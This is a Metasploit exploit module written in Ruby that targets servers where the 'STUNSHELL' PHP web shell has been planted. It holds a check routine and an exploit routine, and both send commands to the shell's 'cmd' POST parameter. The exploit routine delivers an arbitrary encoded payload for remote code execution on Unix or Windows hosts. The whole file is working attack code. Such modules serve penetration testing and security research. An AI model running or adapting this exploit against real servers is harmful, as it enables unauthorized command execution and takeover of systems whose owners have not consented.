require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::HttpClient

	def initialize(info={})
		super(update_info(info,
			'Name'           => '"STUNSHELL" Web Shell Remote Code Execution',
			'Description'    => %q{
				This module exploits unauthenticated versions of the "STUNSHELL" web shell.  This 
				module works when safe mode is disabled on the web server.  This shell is widely 
				used in automated RFI payloads.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'bwall <bwall[at]openbwall.com>',  # vuln discovery & msf module
				],
			'References'     =>
				[
					['URL', 'https://defense.ballastsecurity.net/wiki/index.php/STUNSHELL'],
					['URL', 'https://defense.ballastsecurity.net/decoding/index.php?hash=a4cd8ba05eb6ba7fb86dd66bed968007'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 10000, # Need to test this
					'BadChars' => '',
					'DisableNops' => true,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
						}
				},
			'Platform'       => ['unix', 'win'],
			'Arch'           => ARCH_CMD,
			'Targets'        => [['Automatic',{}]],
			'DisclosureDate' => 'March 23 2013',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('URI',[true, "The path to the andalas_oku shell", "/"]),
			],self.class)
	end

	def check
		uri = normalize_uri(datastore['URI'])
		request_parameters = {
			'method'    => 'POST',
			'uri'       => uri,
			'vars_post' =>
				{
					'cmd' => "echo 'andalas_oku test parameter'"
				}
		}
		shell = send_request_cgi(request_parameters)
		if (shell and shell.body =~ /andalas_oku test parameter/)
			return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end

	def http_send_command(cmd, opts = {})
		uri = normalize_uri(datastore['URI'])
		request_parameters = {
			'method'    => 'POST',
			'uri'       => uri,
			'vars_post' =>
				{
					'cmd' => cmd
				}
		}
		res = send_request_cgi(request_parameters)
		if not (res and res.code == 200)
			fail_with(Exploit::Failure::Unknown, 'Failed to execute the command.')
		end
	end

	def execute_command(cmd, opts = {})
		http_send_command("#{cmd}")
	end

	def exploit
		http_send_command(payload.encoded)
	end
end
